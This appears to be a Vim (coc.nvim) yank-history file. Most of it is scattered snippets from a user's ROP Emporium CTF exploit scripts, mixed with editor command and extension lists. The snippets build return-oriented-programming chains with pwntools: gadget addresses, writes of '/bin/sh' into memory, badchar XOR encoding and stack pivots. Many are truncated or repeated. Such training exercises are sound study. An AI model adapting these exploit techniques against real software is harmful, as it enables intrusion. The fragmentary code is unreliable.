	    POP_RDI = 0x0000000000400b39
fb3a181f9bcb04170b7b80b5f5cb7d3b|file:///home/neo/ropemporium/badchars/exploit.py|33|5|V|python
	    rop = ROP(exe)
183ac2773499065bd0bacf134a56ce6f|file:///home/neo/ropemporium/badchars/exploit.py|33|5|V|python
	    POP_EBX_ECX = rop.find_gadget(["pop ebx", "pop ecx", "ret"]).address
cc1de9a71c27f0426ccaa44eef076d12|file:///home/neo/ropemporium/badchars/exploit.py|35|5|V|python
	    # Pad string to make it a multiple of 4
2374853e2d0b51dfa1fc98c156866ec1|file:///home/neo/ropemporium/badchars/exploit.py|37|5|V|python
	    # Check the characters we want to write. If the string contains a character in badchars, find an allowed character and xor them
	    # Store both characters. We will write the first, then xor it with the second so we get back the desired char
	    # If the initial character is allowed, write it as is and xor it with 0
	    # There was probably a simpler way to do this
bb00514b6b9c20a3af124bb6e2d92895|file:///home/neo/ropemporium/badchars32/exploit.py|95|1|V|python
	badchars = [ 'b', 'i', 'c', '/', '\x20', 'f', 'n', 's', '\x0a' ]
050aae381fba20d970b5590dcd7fcd6f|file:///home/neo/ropemporium/badchars/exploit.py|56|20|V|python
	        chain += p32(POP_ESI_EDI)
	        chain += input_str
	        chain += p32(WRITE_ADDR+i)
	        chain += p32(MOV_EDI_ESI)
2ae10fcc699e6a7f297d642eeab8e979|file:///home/neo/ropemporium/badchars/exploit.py|66|13|V|python
	            chain += xor_str[j] * 8
6399225850b93c1d101bc39a6ef66354|file:///home/neo/ropemporium/badchars/exploit.py|67|26|v|python
	XOR_EBX_CL
f3998349bc7a34755d67394debce7424|file:///home/neo/ropemporium/badchars/exploit.py|91|11|v|python
	rop.find_gadget(["pop rdi", "ret"])
d603a7287ada7f10b8f6cf016ba553c7|file:///home/neo/ropemporium/badchars/exploit.py|92|1|V|python
	0x0000000000400b39
91778b679ec6e1ed83ae807f914b5a91|file:///home/neo/ropemporium/badchars/exploit.py|52|1|V|python
	                log.info("Char xor %d", ord(char_xor))
5b0986c52333d99f6e998091c3a8606c|file:///home/neo/ropemporium/badchars/exploit.py|58|1|V|python
	        log.info("Write addr %#x" % WRITE_ADDR)
83ebdf58125b7822af33c2a8facf458c|file:///home/neo/ropemporium/badchars/exploit.py|100|1|V|python
	log.info("Write addr %#x" % WRITE_ADDR)
dcc7861c55e33e07ef090ec471d57df2|file:///home/neo/ropemporium/badchars/exploit.py|66|9|V|python
	        # Pop ecx to change cl
1797bc30f1fd1bd52b4fc5e9e3b1a6d3|file:///home/neo/ropemporium/badchars/exploit.py|56|1|V|python
	                log.info("Char xor %d", 0)
50a141e09b34068ba5c972749e1a1148|file:///home/neo/ropemporium/badchars/exploit.py|52|1|V|python
	                log.info("Char xor %s", hex(ord(char_xor)))
5cedf06be3bac30d470cbc78f2d25c53|file:///home/neo/ropemporium/badchars/exploit.py|50|1|V|python
	                    log.info("Char xor %s" % hex(ord(char_xor)))
718ccb0a2e0b40defdb2172f0c7c58de|file:///home/neo/ropemporium/badchars/exploit.py|52|1|V|python
	                log.info("Char xor %s" % hex(ord(char_xor)))
ec946cc975af58143151aa8eade5b085|file:///home/neo/ropemporium/badchars/exploit.py|93|41|v|python
	+ 0x1000 (.data contains hex 0x10 which is not allowed)
780cfaf56f4521a0c8fc14ef34f3737c|file:///home/neo/ropemporium/badchars32/exploit.py|96|1|V|python
	# string = "/bin/cat flag.txt"
6271657b5082af3ad47fc50f40db2992|file:///home/neo/ropemporium/badchars/exploit.py|53|52|V|python
	                log.info("Char xor %s" % hex(ord(char_xor)))
	                log.info("Char ok %s" % hex(ord(char_ok)))
0ee5a04341f9ea2ecaa78ee03be61940|file:///home/neo/ropemporium/badchars/exploit.py|57|13|V|python
	        test = ""
	        for j in range(8):
	            test += chr(ord(input_str[j]) ^ ord(xor_str[j]))
	        log.info("Test %s" % test)
22c37a29899eddcd7d4ee40f12039b9d|file:///home/neo/ropemporium/write432/exploit.py|32|1|V|python
	def write(write_addr, string):
	    MOV_EDI_EBP = exe.sym.usefulGadgets
	    POP_EDI_EBP = 0x080486da 
	    chain = ""
	    if len(string) % 4 != 0:
	        string = string + "\x00"*(4 - len(string) % 4)
	    for i in range(0, len(string), 4):
	        chain += p32(POP_EDI_EBP)
	        chain += p32(WRITE_ADDR+i)
	        chain += string[i:i+4] 
	        chain += p32(MOV_EDI_EBP)
	    return chain
	
8fab2590b7de50d6953b82979b48ada9|file:///home/neo/ropemporium/fluff32/exploit.py|35|27|V|python
	                           >]>>>]>
ab587124c787abf5f1090653d8f73c73|file:///home/neo/ropemporium/fluff32/exploit.py|30|8|^v|python
	0x08048693 +35><:    m
84501fa564c787fa59855dc1ef26deb6|file:///home/neo/ropemporium/fluff32/exploit.py|30|8|v|python
	0x08048693 +35><:    
1275e98495f23b0a2cc936f2c7f996da|file:///home/neo/ropemporium/fluff32/exploit.py|31|9|v|python
	          0x08048695 <+37>:    
07a330b5937458b445e00bf3b123ecf7|file:///home/neo/ropemporium/fluff32/exploit.py|32|9|v|python
	             0x08048696 <+38>:    
f524410966efa979c2ea4441da7bfbd2|file:///home/neo/ropemporium/fluff32/exploit.py|33|9|v|python
	                0
54cef05a207ef1d89d3a7654da497001|file:///home/neo/ropemporium/fluff32/exploit.py|33|9|V|python
	        x08048697 <+39>:    xor    BYTE PTR [ecx],bl
	                           0x08048699 <+41>:    ret
ce7c3c21240e313ee200310080cf4abc|file:///home/neo/ropemporium/fluff32/exploit.py|33|9|v|python
	08048697 <+39>:    
f9c46660bbbc9a82b9003007f27db1c3|file:///home/neo/ropemporium/fluff32/exploit.py|34|25|v|python
	  0x08048699 <+41>:    
83241d95c8425072b164982b1f949ae3|file:///home/neo/ropemporium/fluff32/exploit.py|30|5|V|python
	    # pop edi; mov DWORD PTR [ecx],edx; pop ebp; pop ebx; xor BYTE PTR [ecx],bl; ret
b80553cb988486a96f154723533dea52|file:///home/neo/ropemporium/fluff32/exploit.py|31|5|v|python
	# pop edi; mov DWORD PTR [ecx],edx; pop ebp; pop ebx; xor BYTE PTR [ecx],bl; ret
d4df830ddda81560d7bf7ee51c14846f|file:///home/neo/ropemporium/fluff32/exploit.py|34|1|v|python
	   0x08048671 <+1>: xor    e
7804b281bdc7407bd9bc08c8a1f18e42|file:///home/neo/ropemporium/fluff32/exploit.py|34|1|v|python
	   0x08048671 <+1>
0331a91e8fe017d919ea0cb003c55474|file:///home/neo/ropemporium/fluff32/exploit.py|35|1|v|python
	   0x08048673 <+3>: 
adf5f578674b9b5d924482611d89c8c6|file:///home/neo/ropemporium/fluff32/exploit.py|36|1|v|python
	   0x08048674 <+4>: 
95c26542ca513d14199abd07e072d88c|file:///home/neo/ropemporium/fluff32/exploit.py|37|1|v|python
	   0x08048679 <+9>: 
cfce62aeeb054b12769c1bef222581fe|file:///home/neo/ropemporium/fluff32/exploit.py|33|5|v|python
	   edi
1db824a520efe02f6624802363b36819|file:///home/neo/ropemporium/fluff32/exploit.py|33|1|V|python
	pop edi; xor edx,edx; pop esi; mov ebp,0xcafebabe; ret
dbbd2f72e6614e0bdd0aba1accf9134c|file:///home/neo/ropemporium/fluff32/exploit.py|35|1|v|python
	   0x0804867a <+10>:    
917bd1ac157c05b2487a66f1e85c6d96|file:///home/neo/ropemporium/fluff32/exploit.py|36|1|v|python
	   0x0804867b <+11>
5d6a077fd3452d8f18ba2f5463b7b90d|file:///home/neo/ropemporium/fluff32/exploit.py|36|1|v|python
	:    
46eca3b6fb93b2460743d57a074014b8|file:///home/neo/ropemporium/fluff32/exploit.py|37|1|v|python
	   0x0804867d <+13>:    
707a069412dad40cd2f0fa4358e88a0d|file:///home/neo/ropemporium/fluff32/exploit.py|38|1|v|python
	   0x0804867e <+14>:    
22eb3f2836d1d5f80735c4db10604746|file:///home/neo/ropemporium/fluff32/exploit.py|39|1|v|python
	   0x08048683 <+19>:    
3b4ef9d7d7e6a9b93723bfa540a9c8df|file:///home/neo/ropemporium/fluff32/exploit.py|35|1|v|python
	pop esi; xor edx,ebx; pop ebp; mov edi,0xdeadbabe; ret
5c507501630096f1fa6aa0b91338e958|file:///home/neo/ropemporium/fluff32/exploit.py|36|2|v|python
	  0x08048684 <+20>:    
82a2619b943eccf26ee5a1d51c4e6900|file:///home/neo/ropemporium/fluff32/exploit.py|37|1|v|python
	   0x08048689 <+25>
3f431e20361b5d57d6f548eee283f6f4|file:///home/neo/ropemporium/fluff32/exploit.py|38|1|v|python
	   0x0804868b <+27>:    
5608a12f49819ad81d8ff312d0357eac|file:///home/neo/ropemporium/fluff32/exploit.py|39|1|v|python
	   0x0804868c <+28>:    
da57509c3b80e9390fa890e8f340357b|file:///home/neo/ropemporium/fluff32/exploit.py|40|1|v|python
	   0x08048691 <+33>:    
5189e3c0f465452532dc0143b4e82bd7|file:///home/neo/ropemporium/fluff32/exploit.py|36|1|v|python
	mov edi,0xdeadbeef; xchg edx,ecx; pop ebp; mov edx,0xdefaced0; ret
3ba1e8a5aaf33d474e5a01653ce0d5ae|file:///home/neo/ropemporium/fluff32/exploit.py|31|5|v|python
	WRITE_
0a61869a76e469748c09fdc14af78911|file:///home/neo/ropemporium/fluff32/exploit.py|31|5|V|python
	    GADGET4 = 0x08048692 # pop edi; mov DWORD PTR [ecx],edx; pop ebp; pop ebx; xor BYTE PTR [ecx],bl; ret
e79457dfa81a22b569f56e171ba696ee|file:///home/neo/ropemporium/fluff32/exploit.py|41|1|V|python
	        chain += p32(POP_EDI_EBP)
	        chain += p32(WRITE_ADDR+i)
	        chain += string[i:i+4] 
	        chain += p32(MOV_EDI_EBP)
7897f3511edd63ceefd920a1812f36d7|list:/commands|44|1|V|list
	prettier.formatFile
	snippets.openSnippetFiles	Edit snippets files of current document filetype.
	snippets.editSnippets	Edit user snippets file of current document filetype.
	workspace.showOutput	open output buffer to show output from languageservers or extensions.
	workspace.clearWatchman	run watch-del-all for watchman to free up memory.
	workspace.workspaceFolders	show opened workspaceFolders.
	workspace.renameCurrentFile	change current filename to a new name and reload it.
	extensions.toggleAutoUpdate	toggle auto update of extensions.
	workspace.diagnosticRelated	jump to related locations of current diagnostic.
	document.renameCurrentWord	rename word under cursor in current buffer by use multiple cursors.
	document.jumpToNextSymbol	Jump to next symbol highlight position.
	go.install.gomodifytags	Install / update gomodifytags
	go.install.goplay	Install / update goplay
	go.install.gopls	Install / update gopls
	go.install.gotests	Install / update gotests
	go.playground	Run on go playground
	go.tags.add	Add tags to struct fields
	go.tags.add.line	Add tags to struct field in current line
	go.tags.add.prompt	Add tags to struct fields (prompt)
	go.tags.clear	Remove all tags from struct fields
	go.tags.clear.line	Remove all tags from struct fields in current line
	go.tags.remove	Remove tags from struct fields
	go.tags.remove.line	Remove tags from struct field in current line
	go.tags.remove.prompt	Remove tags from struct fields (prompt)
	go.test.generate.exported	Generate unit tests for exported functions in file
	go.test.generate.file	Generate unit tests for file
	go.test.toggle	Toggle test file
	go.version	Print extension version
	java.updateLanguageServer	Download latest snapshots of jdt.ls from eclipse.org.
	java.projectConfiguration.update	Update project configuration
	java.open.serverLog	Open Java Language Server log file
	java.workspace.compile	Force Java compilation
	java.action.organizeImports	Organize Imports
	java.open.formatter.settings	Open Java formatter settings
	java.clean.workspace	Clean the Java language server workspace
	session.save	Save current vim state to session file.
	session.load	Load session by name.
	session.restart	Restart vim with current session.
	mru.validate	Validate mru files list, which remove files that doesn't exist.
	python.enableSourceMapSupport	Enable source map support for extension debugging
	python.sortImports	Sort Imports
	python.startREPL	Start REPL
	python.createTerminal	Create Terminal
	python.buildWorkspaceSymbols	Build Workspace Symbols
	python.execInTerminal	Run Python File in Terminal
	python.setInterpreter	Select Interpreter
	python.upgradePythonLanguageServer	Upgrade MPLS to latest stable version, restart coc.nvim required to take effect.
	python.viewOutput	Show output
	python.goToPythonObject	Go to Python Object
	python.setLinter	Select Linter
	python.enableLinting	Enable Linting
	python.runLinting	Run Linting
	sh.version	Print extension version
	sh.update.bash-language-server	Update bash-language-server
	tsserver.reloadProjects	Reload current project
	tsserver.openTsServerLog	Open log file of tsserver.
	tsserver.goToProjectConfig	Open project config file.
	tsserver.restart	Restart tsserver
	tsserver.watchBuild	Run `tsc --watch` for current project by use vim's job feature.
	tsserver.executeAutofix	Fix autofixable problems of current document.
	editor.action.organizeImport	run organize import code action.
	extensions.forceUpdateAll
	tags.generate
	prettier.open-output
	python.setShebangInterpreter
	python.execSelectionInTerminal
	python.execSelectionInDjangoShell
	python.updateSparkLibrary
	yank.clean
2f35cd75306eea1a38c94cb5179eaf9e|list:/commands|32|1|V|list
	python.sortImports	Sort Imports
	python.execInTerminal	Run Python File in Terminal
	python.setInterpreter	Select Interpreter
	java.action.organizeImports	Organize Imports
	editor.action.organizeImport	run organize import code action.
	python.setShebangInterpreter
	python.execSelectionInTerminal
	python.execSelectionInDjangoShell
	go.install.gopls	Install / update gopls
	go.install.goplay	Install / update goplay
	go.install.gotests	Install / update gotests
	go.install.gomodifytags	Install / update gomodifytags
	go.version	Print extension version
	sh.version	Print extension version
	mru.validate	Validate mru files list, which remove files that doesn't exist.
	session.load	Load session by name.
	session.save	Save current vim state to session file.
	session.restart	Restart vim with current session.
	go.tags.add.line	Add tags to struct field in current line
	python.setLinter	Select Linter
	python.viewOutput	Show output
	python.runLinting	Run Linting
	go.tags.clear.line	Remove all tags from struct fields in current line
	go.tags.remove.line	Remove tags from struct field in current line
	prettier.formatFile
	tsserver.watchBuild	Run `tsc --watch` for current project by use vim's job feature.
	prettier.open-output
	python.enableLinting	Enable Linting
	go.test.generate.file	Generate unit tests for file
	python.createTerminal	Create Terminal
	snippets.editSnippets	Edit user snippets file of current document filetype.
	java.workspace.compile	Force Java compilation
	tsserver.executeAutofix	Fix autofixable problems of current document.
	snippets.openSnippetFiles	Edit snippets files of current document filetype.
	python.updateSparkLibrary
	extensions.forceUpdateAll
	tsserver.goToProjectConfig	Open project config file.
	workspace.renameCurrentFile	change current filename to a new name and reload it.
	extensions.toggleAutoUpdate	toggle auto update of extensions.
	workspace.diagnosticRelated	jump to related locations of current diagnostic.
	java.open.formatter.settings	Open Java formatter settings
	python.buildWorkspaceSymbols	Build Workspace Symbols
	java.projectConfiguration.update	Update project configuration
523019f9ce8ccd7c71d43034734866d9|list:/commands|22|1|V|list
	python.execInTerminal	Run Python File in Terminal
	python.setInterpreter	Select Interpreter
	python.setShebangInterpreter
	python.execSelectionInTerminal
	python.execSelectionInDjangoShell
	go.install.gopls	Install / update gopls
	go.install.goplay	Install / update goplay
	go.install.gotests	Install / update gotests
	go.install.gomodifytags	Install / update gomodifytags
	go.tags.add.line	Add tags to struct field in current line
	python.setLinter	Select Linter
	python.runLinting	Run Linting
	go.tags.clear.line	Remove all tags from struct fields in current line
	go.tags.remove.line	Remove tags from struct field in current line
	python.enableLinting	Enable Linting
	python.createTerminal	Create Terminal
	java.open.formatter.settings	Open Java formatter settings
	go.version	Print extension version
	sh.version	Print extension version
	session.load	Load session by name.
	session.save	Save current vim state to session file.
	session.restart	Restart vim with current session.
	snippets.editSnippets	Edit user snippets file of current document filetype.
	prettier.open-output
	extensions.forceUpdateAll
	extensions.toggleAutoUpdate	toggle auto update of extensions.
	java.action.organizeImports	Organize Imports
	workspace.diagnosticRelated	jump to related locations of current diagnostic.
	editor.action.organizeImport	run organize import code action.
	java.projectConfiguration.update	Update project configuration
	snippets.openSnippetFiles	Edit snippets files of current document filetype.
f247b4d51cff7f285d2a59f7b27711bc|list:/commands|12|1|V|list
	python.execInTerminal	Run Python File in Terminal
	python.setInterpreter	Select Interpreter
	python.setShebangInterpreter
	python.execSelectionInTerminal
	python.setLinter	Select Linter
	python.runLinting	Run Linting
	python.enableLinting	Enable Linting
	go.install.gopls	Install / update gopls
	go.install.goplay	Install / update goplay
	go.install.gotests	Install / update gotests
	go.install.gomodifytags	Install / update gomodifytags
	extensions.toggleAutoUpdate	toggle auto update of extensions.
	session.restart	Restart vim with current session.
	snippets.editSnippets	Edit user snippets file of current document filetype.
	prettier.open-output
	workspace.diagnosticRelated	jump to related locations of current diagnostic.
	extensions.forceUpdateAll
	java.projectConfiguration.update	Update project configuration
	snippets.openSnippetFiles	Edit snippets files of current document filetype.
	java.action.organizeImports	Organize Imports
	editor.action.organizeImport	run organize import code action.
bd62647b02c4f2f54b3d7394e1fb57f5|list:/commands|6|1|V|list
	python.execInTerminal	Run Python File in Terminal
	python.setInterpreter	Select Interpreter
	python.setShebangInterpreter
	python.execSelectionInTerminal
	python.setLinter	Select Linter
	go.install.gotests	Install / update gotests
	extensions.forceUpdateAll
	java.projectConfiguration.update	Update project configuration
	workspace.diagnosticRelated	jump to related locations of current diagnostic.
	extensions.toggleAutoUpdate	toggle auto update of extensions.
	snippets.openSnippetFiles	Edit snippets files of current document filetype.
40feb750b216c00475ccaeefedb9d7b4|list:/commands|3|1|V|list
	python.setInterpreter	Select Interpreter
	python.execInTerminal	Run Python File in Terminal
	python.setShebangInterpreter
	python.execSelectionInTerminal
	python.setLinter	Select Linter
e1e4f043a4bdf390421ec8f7cfb4c882|list:/extensions|3|1|V|list
	* coc-yank	1.1.4	~/.config/coc/extensions/node_modules/coc-yank
	* coc-snippets	2.1.22	~/.config/coc/extensions/node_modules/coc-snippets
	* coc-python	1.2.9	~/.config/coc/extensions/node_modules/coc-python
	* coc-prettier	1.1.11	~/.config/coc/extensions/node_modules/coc-prettier
	* coc-pairs	1.2.21	~/.config/coc/extensions/node_modules/coc-pairs
	* coc-lists	1.3.7	~/.config/coc/extensions/node_modules/coc-lists
	* coc-highlight	1.2.5	~/.config/coc/extensions/node_modules/coc-highlight
	+ coc-tsserver	1.4.12	~/.config/coc/extensions/node_modules/coc-tsserver
	+ coc-sh	0.4.0	~/.config/coc/extensions/node_modules/coc-sh
	+ coc-phpls	2.1.8	~/.config/coc/extensions/node_modules/coc-phpls
	+ coc-json	1.2.5	~/.config/coc/extensions/node_modules/coc-json
	+ coc-java	1.4.8	~/.config/coc/extensions/node_modules/coc-java
	+ coc-go	0.7.0	~/.config/coc/extensions/node_modules/coc-go
6848dbb3463bcdb48799e83b60a88662|list:/extensions|2|1|V|list
	+ coc-java	1.4.8	~/.config/coc/extensions/node_modules/coc-java
	+ coc-json	1.2.5	~/.config/coc/extensions/node_modules/coc-json
e455c3b62322f99f577c57e0152525bb|file:///home/neo/ropemporium/fluff32/exploit.py|42|1|V|python
	        # Put string in ebx
	        chain += p32(POP_EBX)
	        chain += p32(string[i:i+4])
	
	        # Zero out edx
	        chain += p32(GADGET1)
	        chain += "junk" # edi
	        chain += "junk" # esi
	
	        # Xor ebx with edx to move string into edx
	        chain += p32(GADGET2)
e5823ba08cf6f8acc6662017ec572078|file:///home/neo/ropemporium/fluff32/exploit.py|95|15|v|python
	libc
fa6010a8842a5d5d9fd1b6cb2404785a|file:///home/neo/ropemporium/fluff32/exploit.py|52|1|V|python
	        # Xor ebx with edx to move address into edx
	        chain += p32(GADGET2)
	
	        # Put string in ebx
	        chain += p32(POP_EBX)
	        chain += string[i:i+4]
	
	        # Zero out edx
	        chain += p32(GADGET1)
	        chain += "junk" # edi
	        chain += "junk" # esi
	
	        # Xor ebx with edx to move string into edx
	        chain += p32(GADGET2)
	
	        # Exchange edx with ecx (setup ecx)
	        chain += p32(GADGET3)
	        chain += "junk" # ebp
7b35de14ed0286c200df5c5157da67ad|file:///home/neo/ropemporium/fluff32/exploit.py|55|1|V|python
	        # Put string in ebx
	        chain += p32(POP_EBX)
	        chain += string[i:i+4]
	
	        # Zero out edx
	        chain += p32(GADGET1)
	        chain += "junk" # edi
	        chain += "junk" # esi
	
	        # Xor ebx with edx to move string into edx
	        chain += p32(GADGET2)
	
	        # Exchange edx with ecx (setup ecx)
	        chain += p32(GADGET3)
	        chain += "junk" # ebp
	
3ffe24b3377dd67c42d544f06a0a1b76|file:///home/neo/ropemporium/fluff32/exploit.py|54|1|V|python
	        chain += "junk"
a659b73e1e210b57d22604e07b03630e|file:///home/neo/ropemporium/fluff32/exploit.py|54|1|V|python
	        chain += "junk" # esi
	        chain += "junk" # ebp
88d36526235d96557c6652f8ec564e14|file:///home/neo/ropemporium/fluff32/exploit.py|45|7|V|python
	        chain += string[i:i+4]
d56c72c19ea0d6e79e7a3da636afa7fb|file:///home/neo/ropemporium/fluff32/exploit.py|63|9|V|python
	        chain += p32(WRITE_ADDR+i)
adc4add38e26d974b8700bc5b58fbcdc|file:///home/neo/ropemporium/fluff32/exploit.py|49|9|V|python
	        chain += "junk" # edi
87c94345ad7eab1a2f5e3a9f4ad8172b|file:///home/neo/ropemporium/fluff32/exploit.py|53|9|V|python
	        chain += "junk" # esi
f3bedd5a0c1043adfc273ade4a48145f|file:///home/neo/ropemporium/fluff32/exploit.py|31|5|V|python
	    # 1. 
360d04a21916ce46c1939ccb3992ec2b|file:///home/neo/ropemporium/fluff32/exploit.py|98|1|V|python
	payload += write(WRITE_ADDR, "/bin/sh")
bcdef1293f7ce9457f6304d9b695a3b9|file:///home/neo/ropemporium/fluff/exploit.py|57|1|V|python
	# Fill r14 with the address we want to write at and r15 with the string we want to write
	# We only need one gadget since string is 8 bytes
	payload += p64(POP_R14_R15) 
	payload += p64(WRITE_ADDR)
	payload += "/bin/sh\x00"
	
	# Write the string at the address pointed to by r14 
	payload += p64(MOV_R14_R15)
6b7636b4122859dd23cd87585c24ee82|file:///home/neo/ropemporium/fluff/exploit.py|46|1|V|python
	MOV_R14_R15 = 0x0000000000400820
	POP_R14_R15 = rop.find_gadget(["pop r14", "pop r15", "ret"]).address
	POP_RDI = rop.find_gadget(["pop rdi", "ret"]).address
	RET_GADGET = rop.find_gadget(["ret"]).address
ced03c2e16e18b60b04bcccc64a0b78a|file:///home/neo/ropemporium/fluff/exploit.py|46|1|V|python
	MOV_R14_R15 = 0x0000000000400820
407a51b73041682a1faf49b7d3269037|file:///home/neo/ropemporium/fluff/exploit.py|46|1|V|python
	POP_R14_R15 = rop.find_gadget(["pop r14", "pop r15", "ret"]).address
798c7e006d5f065f6e0a487b4363bbf2|file:///home/neo/ropemporium/fluff/exploit.py|48|1|v|python
	0000000000400822 <+2>: 
0fb27b113e6ca538035db6437544ef44|file:///home/neo/ropemporium/fluff/exploit.py|49|4|v|python
	0x0000000000400825 <+5>: 
16dcf4c98d2041579ed5730d60aff2d1|file:///home/neo/ropemporium/fluff/exploit.py|50|1|v|python
	   0x0000000000400827 <+7>: 
e0a6c1343872e20e7d2fb28091a7adb9|file:///home/neo/ropemporium/fluff/exploit.py|51|1|v|python
	   0x000000000040082c <+12>:    
af06c10e99c4a9e1fbe20e2acccb8f6b|file:///home/neo/ropemporium/fluff/exploit.py|48|1|V|python
	xor r11,r11; pop r14; mov edi,0x601050; ret
992d151d9ff7f23518f6b6f2ae0afcec|file:///home/neo/ropemporium/fluff/exploit.py|48|1|v|python
	000000000040082f <+15>:    
ab10a8353e74a7025b587d8b941ba865|file:///home/neo/ropemporium/fluff/exploit.py|49|1|v|python
	   0x0000000000400832 <+18>:    
102477ca488b128617cc09d1f9907f01|file:///home/neo/ropemporium/fluff/exploit.py|50|1|v|python
	   0x0000000000400834 <+20>:    
95c8b80dea04f43ed9acb44b7d1a93a3|file:///home/neo/ropemporium/fluff/exploit.py|51|1|v|python
	   0x000000000040083a <+26>:    
22bbb139e343e8ad8d08207eed24c399|file:///home/neo/ropemporium/fluff/exploit.py|48|1|v|python
	xor r11,r12; pop r12; mov r13d,0x604060; ret
e7a842a2561c4de05978b8155583c00d|file:///home/neo/ropemporium/fluff/exploit.py|49|1|v|python
	0000000000400840 <+32>:    
0d5aa733dc2549a4110ff5e17fac6336|file:///home/neo/ropemporium/fluff/exploit.py|50|1|v|python
	   0x0000000000400843 <+35>:    
b511fa19f47e42c6d538ef18c9777d9c|file:///home/neo/ropemporium/fluff/exploit.py|51|1|v|python
	   0x0000000000400845 <+37>:    
e7f9e3322b091519f9510bc7026c4a50|file:///home/neo/ropemporium/fluff/exploit.py|52|1|v|python
	   0x000000000040084b <+43>:    
c2ea332e5d2c0783036398c36bc92b30|file:///home/neo/ropemporium/fluff/exploit.py|49|1|V|python
	xchg r11,r10; pop r15; mov r11d,0x602050; ret
a430abdf03ec332d5f0ba06cf29497ef|file:///home/neo/ropemporium/fluff/exploit.py|50|1|v|python
	   0x000000000040084e <+46>:    
3b7d5fdabb52cd182109a6e6a998a8c3|file:///home/neo/ropemporium/fluff/exploit.py|51|1|v|python
	   0x0000000000400851 <+49>:    
9d0ec428c714371ba8fc38f84d77af81|file:///home/neo/ropemporium/fluff/exploit.py|52|1|v|python
	   0x0000000000400853 <+51>:    
d2b99c1f7beeeddd15b4c641b8584ceb|file:///home/neo/ropemporium/fluff/exploit.py|53|1|v|python
	   0
51e90f62972a43c1b5836c8e376dbb5a|file:///home/neo/ropemporium/fluff/exploit.py|53|1|v|python
	0000000000400855 <+53>:    
9141eb879ed1c26481dc304bdb72f438|file:///home/neo/ropemporium/fluff/exploit.py|54|1|v|python
	   0x0000000000400858 <+56>:    
9bc9a3bc36b4360638e7c621b6c11d2c|file:///home/neo/ropemporium/fluff/exploit.py|50|1|v|python
	mov QWORD PTR [r10],r11; pop r13; pop r12; xor BYTE PTR [r10],r12b; ret
884d9804999fc47a3c2694e49ad2536a|file:///home/neo/ropemporium/fluff32/exploit.py|58|15|v|python
	address
bf42b21ee6b1f5c363d83da2593830a1|file:///home/neo/ropemporium/fluff/exploit.py|60|1|V|python
	# Put address we want to write at in r12
	payload += p64(POP_R12)
	payload += p64(WRITE_ADDR)
	
	# Zero out r11
	payload += p64(GADGET1)
	payload += "junkjunk" # r14
	
	# Xor r11 with r12 
	payload += p64(GADGET2)
	payload += "junkjunk" # r12
ab35649f5c23975506855c2dc70e8c6a|file:///home/neo/ropemporium/fluff/exploit.py|76|8|v|python
	ddress
9cf9aa8819905231f65e57927778aa11|file:///home/neo/ropemporium/fluff/exploit.py|78|16|v|python
	WRITE_ADDR
c1d9875013ad457820b1f66f3986db88|file:///home/neo/ropemporium/fluff/exploit.py|6|31|v|python
	write4
52c9975d44e8c49328c72a9c2cee9866|file:///home/neo/ropemporium/fluff/exploit.py|97|1|V|python
	# A return gadget to align the stack, then call system
	# payload += p64(RET_GADGET)
b429063c4783a72aa65ece6bd8babde1|file:///home/neo/ropemporium/fluff/exploit.py|52|1|V|python
	RET_GADGET = rop.find_gadget(["ret"]).address
367fee042b7d29c2c7704a0b8231935a|file:///home/neo/ropemporium/pivot32/exploit.py|53|1|V|python
	RET2WIN_ADDR = libpivot.sym.ret2win
0696e861012dad2cf244fc8fc4e0ed64|file:///home/neo/ropemporium/pivot32/exploit.py|66|1|V|python
	payload += p32(PIVOT_ADDR)
44c830c2ac4ecde6d55d9fd2acf6aaf3|file:///home/neo/ropemporium/pivot32/exploit.py|68|1|V|python
	# payload += p32(PIVOT_ADDR)
84f13f509941d22849a196fa2f80aa68|file:///home/neo/ropemporium/pivot32/exploit.py|58|1|V|python
	log.info("Pivot address: %#x" % PIVOT_ADDR)
d40ac5bd014906482c73204604bb477e|file:///home/neo/ropemporium/pivot32/exploit.py|50|1|V|python
	log.info("Foothold got: %#x" % FOOTHOLD_GOT)
a6d88c01effeee1957ac7337531e5e96|file:///home/neo/ropemporium/pivot32/exploit.py|51|1|V|python
	log.info("Foothold : %#x" % FOOTHOLD_GOT)
79a035dec29762be5b9f3eecb312f4ff|file:///home/neo/ropemporium/pivot32/exploit.py|55|37|v|python
	FOOTHOLD_GOT
99993e7c37da456c6fc82e7418dde6d2|file:///home/neo/ropemporium/pivot32/exploit.py|57|50|v|python
	foothold_function
48f486a4f52e892637550b38ad95a9f9|file:///home/neo/ropemporium/pivot32/exploit.py|57|1|V|python
	log.info("Foothold libpirot: %#x" % libpivot.sym.ret2win)
97b207fc1455b60988b7e97a06911e72|file:///home/neo/ropemporium/pivot32/exploit.py|63|1|V|python
	payload = "A" * OFFSET
532ca7b4e20424afa8b1769592429a87|file:///home/neo/ropemporium/pivot32/exploit.py|51|1|V|python
	# io.sendline(cyclic(1024))
	OFFSET = cyclic_find(0x6161616c)
21a361d96e3e13f5f109748c2a9d2434|file:///home/neo/ropemporium/pivot32/exploit.py|57|30|v|python
	push
00e56b12c789e35a6e59387de1fa1c87|file:///home/neo/ropemporium/pivot32/exploit.py|75|16|v|python
	PUSH_EAX
930a3f9bec7fb8dac59aa30e9e7dbddc|file:///home/neo/ropemporium/pivot32/exploit.py|57|22|v|python
	:rop.find_gadget(["call eax"]).address
a359c37ddc7ae758200d17c3acb5224b|file:///home/neo/ropemporium/pivot/exploit.py|50|1|V|python
	POP_RDI = rop.find_gadget(["pop rdi", "ret"]).address
6977dd3672e4ec92307c5676ca4a86f5|file:///home/neo/ropemporium/pivot32/exploit.py|60|1|V|python
	line = io.recvline_contains('The Old Gods kindly bestow upon you a place to pivot:')
	PIVOT_ADDR = int(line[-10:], 16)
c482380e299fd2c169635925a4e826ab|file:///home/neo/ropemporium/pivot/exploit.py|45|41|V|python
	line = io.recvline_contains('The Old Gods kindly bestow upon you a place to pivot:')
	PIVOT_ADDR = int(line[-14:], 16)
44bd58d096c673d42e7d476990c93f2a|file:///home/neo/ropemporium/pivot32/exploit.py|63|1|V|python
	# payload = "A" * OFFSET
7a1a5f3e79fdc91edf2f5ead9d66abb4|file:///home/neo/ropemporium/pivot/exploit.py|65|3|v|python
	Read
eb13f410d3ada60f555b5ea20e2d24cd|file:///home/neo/ropemporium/pivot/exploit.py|65|3|v|python
	Leak
668fb52f82b9837bd98dd35f1f35d41a|file:///tmp/neomutt-neo-1000-3850-8145866455276203597|1|8|v|mail
	Zoom works just fine!
448cef4d01203b956e03b1a0f61eed5b|file:///home/neo/ropemporium/ret2csu/exploit.py|47|1|V|python
	PUTS_GOT = exe.got["puts"]
